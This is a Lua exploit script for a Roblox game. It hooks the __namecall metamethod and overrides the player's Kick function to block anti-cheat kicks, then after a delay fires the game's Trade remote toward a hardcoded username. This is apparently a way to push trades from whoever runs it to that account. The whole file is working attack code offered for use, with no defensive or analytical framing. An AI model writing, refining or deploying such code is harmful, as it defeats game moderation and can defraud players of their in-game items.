-- ===== CONFIG =====
local TARGET_PLAYER = "Apayps"  -- Change to target username
local TRADE_DELAY = 4           -- Seconds before trading (3-5 recommended)

-- ===== METATABLE PROTECTION (NO FINDFIRSTCHILD) =====
do
    -- Get metatable through alternative method
    local mt
    for _,v in pairs(debug.getregistry()) do
        if type(v) == "table" and rawget(v, "__mode") then
            mt = v
            break
        end
    end

    -- Backup original functions
    local original = {
        namecall = mt and mt.__namecall,
        index = mt and mt.__index
    }

    -- Block kicks via namecall
    if mt then
        mt.__namecall = function(self, ...)
            local method = getnamecallmethod()
            if method and string.lower(tostring(method)) == "kick" then
                return nil
            end
            return original.namecall(self, ...)
        end
    end

    -- Direct Kick method override
    local player = game:GetService("Players").LocalPlayer
    if player then
        local oldKick = player.Kick
        player.Kick = function() return nil end
    end
end

-- ===== TRADE SYSTEM (NO FINDFIRSTCHILD) =====
local function SendTrade(targetName)
    -- Get services through alternative methods
    local repStorage = game:GetService("ReplicatedStorage")
    local players = game:GetService("Players")

    -- Wait for game to load
    while not players.LocalPlayer do task.wait() end

    -- Find target player by iterating
    local target
    for _, player in pairs(players:GetChildren()) do
        if player.Name == targetName then
            target = player
            break
        end
    end
    if not target then return false end

    -- Find trade remote by iterating
    local tradeRemote
    for _, child in pairs(repStorage:GetChildren()) do
        if child.Name == "Trade" then
            for _, remote in pairs(child:GetChildren()) do
                if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
                    tradeRemote = remote
                    break
                end
            end
            break
        end
    end

    -- Execute trade
    if tradeRemote then
        return pcall(function()
            if tradeRemote:IsA("RemoteFunction") then
                tradeRemote:InvokeServer(target)
            else
                tradeRemote:FireServer(target)
            end
            return true
        end)
    end
    return false
end

-- ===== DELAYED EXECUTION =====
task.spawn(function()
    task.wait(TRADE_DELAY)
    SendTrade(TARGET_PLAYER)
end)

print("System loaded - Protection active")
